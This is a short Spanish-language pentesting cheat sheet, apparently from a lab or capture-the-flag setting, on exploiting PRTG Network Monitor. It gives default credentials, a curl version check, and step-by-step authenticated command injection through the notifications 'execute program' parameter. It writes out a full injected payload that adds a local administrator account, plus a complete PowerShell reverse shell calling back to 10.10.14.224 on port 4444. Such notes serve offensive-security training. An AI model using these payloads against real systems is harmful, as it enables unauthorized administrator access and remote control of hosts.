### Info

- Es usado para monitorear el tráfico del ancho de banda
- actualizar y recolectar estadisticas de varios hosts incluyendo routers, switches, servers.
- Se puede consultar la información recopilada desde la REST API.
- Es un servicio que corre en AHAX-based website
- Default keys: prtgadmin:prtgadmin

### ENUM

Podemos llegar al login simplemente accediendo a la web con el puerto:

    http://10.129.201.50:8080/index.htm

##### Version:

    curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version


### Explotación:

Si la versión es menor a 18.2.39, entonces sufre una authenticated command-injection.

##### 1)Vamos a setup > Account settings > Notifications
##### 2)Add new notification
##### 3)Le damos a la notificación un nombre y vamos al fondo a darle a "execute program"
##### 4)Luego seleccionamos "Demo exe notification -outfile.ps1" en la opción "Program file"
##### 5) En la opción parameter inyectamos el comando (correrá en un powershell)
    test.txt;net user <user> <pass> /add;net localgroup administrators <user> /add

or generate a reverseshell:

    test.txt;$client = New-Object System.Net.Sockets.TCPClient('10.10.14.224',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
##### 6)Le damos a "save" y nos redirige a notifications donde vamos a tener nuestra notificación.
##### 7)Le damos a test (si hay un pop up con un error, podemos doblechequear la notificación y correrlo otra vez)
##### Luego testeamos con crackmapexec para ver si se creó el user

    sudo crackmapexec smb 10.129.201.50 -u <user> -p <pass> 
